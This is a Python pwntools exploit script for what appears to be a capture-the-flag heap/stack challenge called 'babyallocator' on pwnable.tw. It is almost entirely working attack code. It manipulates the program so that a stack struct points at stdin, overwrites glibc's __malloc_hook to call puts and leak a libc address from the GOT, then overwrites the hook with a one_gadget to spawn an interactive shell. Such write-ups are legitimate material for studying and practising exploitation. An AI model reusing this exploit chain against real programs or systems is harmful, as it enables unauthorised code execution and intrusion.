from pwn import *


sla = lambda delim, data: p.sendlineafter(delim, data)
sa = lambda delim, data: p.sendafter(delim, data)



def alloc_on_stack(size_0x7f_to_0xfff, name):
    sla(b'Your choice:', b'1')
    sla(b'Size :', str(size_0x7f_to_0xfff).encode())
    sla(b'name of the allocator ? :', name)

def alloc_on_heap(size_larger_0xff, name):
    sla(b'Your choice:', b'2')
    sla(b'Size :', str(size_larger_0xff).encode())
    sla(b'name of the allocator ? :', name)
def write_data(data):
    sla(b'Your choice:', b'3')
    sa(b'Content :', data)
def loop():
    sla(b'Your choice:', b'4')
def free():
    sla(b'Your choice:', b'5')
elf = context.binary = ELF('babyallocator')
libc = ELF('libc.so.6')



#nc chall.pwnable.tw 10404
#p = remote('chall.pwnable.tw', 10404)

p = process()
#gdb.attach(p, gdbscript='''
#b * 0x401e30
#           b *0x40146a
#           b *0x402617
#           c
#''')



RET = 0x00000000004009f0 #: ret

for i in range(0x3):                    # these lines simply are just for calculate stack address 
    alloc_on_stack(0xfff, b'A')         # that the stdin is put on struct + 0x28 field
    loop()                              #
alloc_on_stack(0xd00, b'A')             # fill the stack segment
write_data(b'A'*0x10)                   #
for i in range(0x4):                    #
#    print(i)                           #
    loop()                              #
#alloc_on_heap(0x100, b'A')             #
alloc_on_stack(0x750, b'A')             # after this struct + 0x28 field will be stdin
for i in range(0x10):
    loop()
alloc_on_stack(0xfff, b'A')             # get the stdin to write
CALL_PUTS = 0x401498
#write_data(b'A'*0x50 + b'\x00'*(libc.symbols['__malloc_hook'] - libc.symbols['_IO_2_1_stdin_'] - 144 - 0x50) + p64(elf.plt['puts']))
# WE DONT USE elf.plt['puts'] here because it will return 7 (len of string) so that the return address will be invalid
write_data(b'A'*0x50 + b'\x00'*(libc.symbols['__malloc_hook'] - libc.symbols['_IO_2_1_stdin_'] - 144 - 0x50) + p64(CALL_PUTS)) # write to __malloc_hook
loop()
sla(b'Your choice:', b'2')
sla(b'Size :', str(elf.got['puts']).encode())
leak = p.recvline()[:-1]
leak = int.from_bytes(leak, byteorder='little')
print('leak: ', hex(leak))
libc.address = leak - libc.symbols['puts']
print('libc: ', hex(libc.address))
ONE_GADGET = libc.address + 0x4526a
print('one gadget: ', hex(ONE_GADGET))
# since the CALL_PUTS above is a puts of option release so now we're back to stack that having ptr is stdin
# we simply write overwrite __malloc_hook with one_gadget
write_data(b'A'*0x50 + b'\x00'*(libc.symbols['__malloc_hook'] - libc.symbols['_IO_2_1_stdin_'] - 144 - 0x50) + p64(ONE_GADGET))
loop()
sla(b'Your choice:', b'2')
sla(b'Size :', str(0x100).encode())

p.interactive()